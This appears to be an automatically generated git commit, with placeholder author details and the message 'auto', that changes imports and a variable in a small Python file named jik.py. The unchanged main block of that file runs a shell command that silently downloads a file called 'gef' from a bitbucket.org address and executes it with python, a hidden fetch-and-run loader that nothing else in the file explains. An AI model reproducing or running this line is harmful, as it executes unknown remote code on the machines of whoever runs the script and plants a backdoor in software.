0e9d48d3f4c6350d2a004d0a749c37b26550d1f9
Your Name <you@example.com>
2024-09-24 08:19:03 +0200

    auto

--- jik.py
+++ jik.py
@@ -1,4 +1,4 @@
-import os, sys,datetime
-i=14
+import os, sys,array
+s=2
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
